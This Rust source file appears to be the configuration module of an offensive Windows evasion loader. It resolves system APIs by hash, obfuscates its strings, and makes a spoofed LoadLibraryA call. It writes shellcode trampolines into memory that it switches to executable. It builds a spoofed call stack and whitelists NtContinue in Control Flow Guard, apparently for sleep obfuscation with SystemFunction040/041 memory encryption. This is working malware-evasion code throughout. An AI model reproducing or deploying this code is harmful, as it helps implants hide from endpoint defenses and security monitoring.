use alloc::string::String;
use core::{ffi::c_void, ptr::null_mut};

use obfstr::{obfbytes as b, obfstring as s};
use anyhow::{Context, Result, bail};
use dinvk::{
    data::NT_SUCCESS,
    parse::PE,
    hash::{jenkins3, murmur3},
    *,
};

use crate::{data::*, stack::Stack};
use crate::functions::{
    NtAllocateVirtualMemory, 
    NtLockVirtualMemory, 
    NtProtectVirtualMemory,
    SetProcessValidCallTargets,
    NtQueryInformationProcess
};

/// Lazily initializes and returns a singleton [`Config`] instance.
#[inline(always)]
pub fn init_config() -> anyhow::Result<&'static Config> {
    CONFIG.try_call_once(Config::new)
}

/// Global configuration object containing resolved module base addresses,
/// function pointers, and spoofed stack metadata.
static CONFIG: spin::Once<Config> = spin::Once::new();

/// Stores resolved DLL base addresses and function pointers.
#[derive(Default, Debug, Clone, Copy)]
pub struct Config {
    /// Custom thread stack, including a reserved memory region
    /// and frame sizes for spoofed call sequences
    pub stack: Stack,

    /// Callback to be executed to process NtContinue
    pub callback: u64,

    /// Trampoline function to be executed right after `RtlCaptureContext`.
    pub trampoline: u64,

    /// Address of solved modules
    pub modules: Modules,

    /// Resolvable addresses for kernel32.dll
    pub wait_for_single: WinApi,
    pub base_thread: WinApi,
    pub enum_date: WinApi,

    /// Resolvable addresses for cyptbase.dll
    pub system_function040: WinApi,
    pub system_function041: WinApi,

    /// Resolvable addresses for `ntdll.dll
    pub nt_continue: WinApi,
    pub nt_set_event: WinApi,
    pub rtl_user_thread: WinApi,
    pub nt_protect_virtual_memory: WinApi,
    pub rtl_exit_user_thread: WinApi,
    pub nt_get_context_thread: WinApi,
    pub nt_set_context_thread: WinApi,
    pub nt_test_alert: WinApi,
    pub nt_wait_for_single: WinApi,
    pub rtl_acquire_lock: WinApi,
    pub tp_release_cleanup: WinApi,
    pub rtl_capture_context: WinApi,
    pub zw_wait_for_worker: WinApi,
}

/// Holds resolved base addresses for core Windows DLLs required during initialization.
#[derive(Debug, Clone, Copy, Default)]
pub struct Modules {
    /// Base address of `ntdll.dll`.
    pub ntdll: Dll,

    /// Base address of `kernel32.dll`.
    pub kernel32: Dll,

    /// Base address of `cryptbase.dll`.
    pub cryptbase: Dll,

    /// Base address of `kernelbase.dll`.
    pub kernelbase: Dll,
}

impl Config {
    /// Create a new [`Config`].
    pub fn new() -> anyhow::Result<Self> {
        // Resolve module base addresses (ntdll, kernel32, cryptbase, etc.)
        let modules = Self::modules();

        // Resolve hashed function addresses for all required APIs
        let mut cfg = Self::functions(modules);

        // Initialize custom stack layout used for context spoofing
        cfg.stack = Stack::new(&cfg)?;

        // Allocating a callback for the NtContinue call
        cfg.callback = Self::alloc_callback()?;

        // Allocating trampoline to thread pools
        cfg.trampoline = Self::alloc_trampoline()?;

        // Register Control Flow Guard (CFG) function targets if enabled
        if let Ok(true) = Cfg::is_enabled() {
            Cfg::enable(&cfg);
        }

        Ok(cfg)
    }

    /// Allocates a small executable memory region used as a trampoline in thread pool callbacks.
    ///
    /// # Returns
    ///
    /// * `Ok(u64)` — Address of the executable trampoline stub.
    /// * `Err(anyhow::Error)` — If memory allocation or permission change fails.
    pub fn alloc_callback() -> Result<u64> {
        // Trampoline shellcode
        let callback = b!(&[
            0x48, 0x89, 0xD1,       // mov rcx,rdx
            0x48, 0x8B, 0x41, 0x78, // mov rax,QWORD PTR [rcx+0x78] (CONTEXT.RAX)
            0xFF, 0xE0,             // jmp rax
        ]);

        // Allocate RW memory for trampoline
        let mut size = callback.len();
        let mut addr = null_mut();
        if !NT_SUCCESS(NtAllocateVirtualMemory(
            NtCurrentProcess(), 
            &mut addr, 
            0, 
            &mut size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE
        )) {
            bail!(s!("Failed to allocate stack memory"));
        }

        // Write trampoline bytes to allocated memory
        unsafe { core::ptr::copy_nonoverlapping(callback.as_ptr(), addr as *mut u8, callback.len()) };

        // Change protection to RX for execution
        let mut old_protect = 0;
        if !NT_SUCCESS(NtProtectVirtualMemory(
            NtCurrentProcess(), 
            &mut addr, 
            &mut size, 
            PAGE_EXECUTE_READ as u32, 
            &mut old_protect
        )) {
            bail!(s!("Failed to change memory protection for RX"));
        }

        // Locks the specified region of virtual memory into physical memory,
        // preventing it from being paged to disk by the memory manager.
        NtLockVirtualMemory(NtCurrentProcess(), &mut addr, &mut size, VM_LOCK_1);
        Ok(addr as u64)
    }

    /// Allocates trampoline memory for the execution of `RtlCaptureContext`
    ///
    /// # Returns
    ///
    /// * `Ok(u64)` - The address of the executable trampoline
    /// * `Err(anyhow::Error)` - If memory allocation or protection fails
    pub fn alloc_trampoline() -> Result<u64> {
        // Trampoline shellcode
        let trampoline = b!(&[
            0x48, 0x89, 0xD1, // mov rcx,rdx
            0x48, 0x31, 0xD2, // xor rdx,rdx
            0xFF, 0x21,       // jmp QWORD PTR [rcx]
        ]);

        // Allocate RW memory for trampoline
        let mut size = trampoline.len();
        let mut addr = null_mut();
        if !NT_SUCCESS(NtAllocateVirtualMemory(
            NtCurrentProcess(), 
            &mut addr, 
            0, 
            &mut size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE
        )) {
            bail!(s!("Failed to allocate stack memory"));
        }

        // Write trampoline bytes to allocated memory
        unsafe { core::ptr::copy_nonoverlapping(trampoline.as_ptr(), addr as *mut u8, trampoline.len()) };

        // Change protection to RX for execution
        let mut old_protect = 0;
        if !NT_SUCCESS(NtProtectVirtualMemory(
            NtCurrentProcess(), 
            &mut addr, 
            &mut size, 
            PAGE_EXECUTE_READ as u32, 
            &mut old_protect
        )) {
            bail!(s!("Failed to change memory protection for RX"));
        }

        // Locks the specified region of virtual memory into physical memory,
        // preventing it from being paged to disk by the memory manager.
        NtLockVirtualMemory(NtCurrentProcess(), &mut addr, &mut size, VM_LOCK_1);
        Ok(addr as u64)
    }

    /// Resolves the base addresses of key Windows modules (`ntdll.dll`, `kernel32.dll`, etc).
    ///
    /// # Returns
    ///  
    /// * Returns raw pointers as `*mut c_void`, which are converted to `u64` inside [`Self::functions`].
    ///
    /// # Panics
    ///
    /// * Will panic if spoofed `LoadLibraryA` call fails.
    fn modules() -> Modules {
        // Load essential DLLs
        let ntdll = get_ntdll_address();
        let kernel32 = GetModuleHandle(2808682670u32, Some(murmur3));
        let kernelbase = GetModuleHandle(2737729883u32, Some(murmur3));
        let load_library = GetProcAddress(kernel32, 4066094997u32, Some(murmur3));
        let cryptbase = {
            let mut addr = GetModuleHandle(3312853920u32, Some(murmur3));
            if addr.is_null() {
                addr = uwd::spoof!(load_library, obfstr::obfcstr!(c"CryptBase").as_ptr())
                    .expect(obfstr::obfstr!("Error"))
            }

            addr
        };

        Modules {
            ntdll: Dll::from(ntdll),
            kernel32: Dll::from(kernel32),
            cryptbase: Dll::from(cryptbase),
            kernelbase: Dll::from(kernelbase),
        }
    }

    /// Resolves hashed API function addresses using [`GetProcAddress`] and populates the [`Config`] fields.
    ///
    /// # Arguments
    ///
    /// * `modules` - A [`Modules`] struct containing base addresses for `ntdll.dll`, `kernel32.dll`, and `cryptbase.dll`.
    ///
    /// # Returns
    ///
    /// * A [`Config`] struct with resolved function pointers (without stack info).
    fn functions(modules: Modules) -> Self {
        let ntdll = modules.ntdll.as_ptr();
        let kernel32 = modules.kernel32.as_ptr();
        let cryptbase = modules.cryptbase.as_ptr();

        Self {
            modules,
            wait_for_single: GetProcAddress(kernel32, 4186526855u32, Some(jenkins3)).into(),
            base_thread: GetProcAddress(kernel32, 4083630997u32, Some(murmur3)).into(),
            enum_date: GetProcAddress(kernel32, 695401002u32, Some(jenkins3)).into(),
            system_function040: GetProcAddress(cryptbase, 1777190324, Some(murmur3)).into(),
            system_function041: GetProcAddress(cryptbase, 587184221, Some(murmur3)).into(),
            nt_continue: GetProcAddress(ntdll, 3396789853u32, Some(jenkins3)).into(),
            rtl_capture_context: GetProcAddress(ntdll, 1384243883u32, Some(jenkins3)).into(),
            nt_set_event: GetProcAddress(ntdll, 1943906260, Some(jenkins3)).into(),
            rtl_user_thread: GetProcAddress(ntdll, 1578834099, Some(murmur3)).into(),
            nt_protect_virtual_memory: GetProcAddress(ntdll, 581945446, Some(jenkins3)).into(),
            rtl_exit_user_thread: GetProcAddress(ntdll, 1518183789, Some(jenkins3)).into(),
            nt_set_context_thread: GetProcAddress(ntdll, 3400324539u32, Some(jenkins3)).into(),
            nt_get_context_thread: GetProcAddress(ntdll, 437715432, Some(jenkins3)).into(),
            nt_test_alert: GetProcAddress(ntdll, 2960797277u32, Some(murmur3)).into(),
            nt_wait_for_single: GetProcAddress(ntdll, 2606513692u32, Some(jenkins3)).into(),
            rtl_acquire_lock: GetProcAddress(ntdll, 160950224u32, Some(jenkins3)).into(),
            tp_release_cleanup: GetProcAddress(ntdll, 2871468632u32, Some(jenkins3)).into(),
            zw_wait_for_worker: GetProcAddress(ntdll, 2326337356u32, Some(jenkins3)).into(),
            ..Default::default()
        }
    }
}

/// Wrapper for querying and modifying Control Flow Guard (CFG) policy
struct Cfg;

impl Cfg {
    /// CFG_CALL_TARGET_VALID flag indicating a valid indirect call target.
    const CFG_CALL_TARGET_VALID: usize = 1;
    
    /// Used internally by Windows to identify per-process CFG state.
    const PROCESS_COOKIE: u32 = 36;
    
    /// Used for combining with ProcessCookie to retrieve CFG policy.
    const PROCESS_USER_MODE_IOPL: u32 = 16;
    
    /// Mitigation policy ID for Control Flow Guard (CFG)
    const ProcessControlFlowGuardPolicy: i32 = 7i32;

    /// Checks if Control Flow Guard (CFG) is enabled for the current process.
    ///
    /// # Returns
    ///
    /// * `Ok(true)` if CFG is enforced, `Ok(false)` if not, or an error if the query fails.
    pub fn is_enabled() -> Result<bool> {
        let mut proc_info = EXTENDED_PROCESS_INFORMATION {
            ExtendedProcessInfo: Self::ProcessControlFlowGuardPolicy as u32,
            ..Default::default()
        };

        let status = NtQueryInformationProcess(
            NtCurrentProcess(),
            Self::PROCESS_COOKIE | Self::PROCESS_USER_MODE_IOPL,
            &mut proc_info as *mut _ as *mut c_void,
            size_of::<EXTENDED_PROCESS_INFORMATION>() as u32,
            null_mut(),
        );

        if !NT_SUCCESS(status) {
            bail!(s!("NtQueryInformationProcess Failed"));
        }

        Ok(proc_info.ExtendedProcessInfoBuffer != 0)
    }

    /// Adds a valid CFG call target for the given module base and target function.
    ///
    /// If CFG is not enabled, the call is silently ignored.
    ///
    /// # Arguments
    ///
    /// * `module` - Base address of the module.
    /// * `function` - Function pointer inside the module to mark as valid.
    ///
    /// # Returns
    ///
    /// * `Ok(())` on success, or an error if the operation fails or CFG query fails.
    pub fn add(module: usize, function: usize) -> Result<()> {
        unsafe {
            let nt_header = PE::parse(module as *mut c_void)
                .nt_header()
                .context(s!("Invalid NT header"))?;

            // Memory range to apply the CFG policy
            let size = ((*nt_header).OptionalHeader.SizeOfImage as usize + 0xFFF) & !0xFFF;

            // Describe the valid call target
            let mut cfg = CFG_CALL_TARGET_INFO {
                Flags: Self::CFG_CALL_TARGET_VALID,
                Offset: function - module,
            };

            // Apply the new valid call target
            if SetProcessValidCallTargets(
                NtCurrentProcess(), 
                module as *mut c_void, 
                size, 
                1, 
                &mut cfg
            ) == 0 
            {
                bail!(s!("SetProcessValidCallTargets Failed"))
            }
        }

        Ok(())
    }

    /// Registers known indirect call targets with Control Flow Guard (CFG).
    ///
    /// # Arguments
    ///
    /// * `cfg` - A reference to the resolved function configuration used by the loader.
    pub fn enable(cfg: &Config) {
        let targets = [(cfg.modules.ntdll, cfg.nt_continue)];
        for (module, func) in targets {
            if let Err(e) = Self::add(module.as_u64() as usize, func.as_u64() as usize) {
                if cfg!(debug_assertions) {
                    dinvk::println!("CFG::add failed: {e}");
                }
            }
        }
    }
}

/// Wrapper for DLL base addresses (`HMODULE`) stored as `u64`.
#[derive(Default, Debug, Clone, Copy)]
#[repr(transparent)]
pub struct Dll(u64);

impl Dll {
    /// Returns the address as a mutable pointer.
    #[inline(always)]
    pub fn as_ptr(self) -> *mut c_void {
        self.0 as *mut c_void
    }

    /// Returns the address as a `u64`.
    #[inline(always)]
    pub fn as_u64(self) -> u64 {
        self.0
    }
}

impl From<*mut c_void> for Dll {
    fn from(ptr: *mut c_void) -> Self {
        Self(ptr as u64)
    }
}

impl From<u64> for Dll {
    fn from(addr: u64) -> Self {
        Self(addr)
    }
}

impl From<Dll> for u64 {
    fn from(dll: Dll) -> Self {
        dll.0
    }
}

/// Wrapper for WinAPI function pointers stored as `u64`.
#[derive(Default, Debug, Clone, Copy)]
#[repr(transparent)]
pub struct WinApi(u64);

impl WinApi {
    /// Returns the pointer as a const `*const c_void`.
    #[inline(always)]
    pub fn as_ptr(self) -> *const c_void {
        self.0 as *const c_void
    }

    /// Returns the pointer as a mutable `*mut c_void`.
    #[inline(always)]
    pub fn as_mut_ptr(self) -> *mut c_void {
        self.0 as *mut c_void
    }

    /// Returns true if the pointer is null.
    #[inline(always)]
    pub fn is_null(self) -> bool {
        self.0 == 0
    }

    /// Returns the address as a `u64`.
    #[inline(always)]
    pub fn as_u64(self) -> u64 {
        self.0
    }
}

impl From<*const c_void> for WinApi {
    fn from(ptr: *const c_void) -> Self {
        Self(ptr as u64)
    }
}

impl From<*mut c_void> for WinApi {
    fn from(ptr: *mut c_void) -> Self {
        Self(ptr as u64)
    }
}

impl From<u64> for WinApi {
    fn from(addr: u64) -> Self {
        Self(addr)
    }
}

impl From<WinApi> for u64 {
    fn from(api: WinApi) -> Self {
        api.0
    }
}
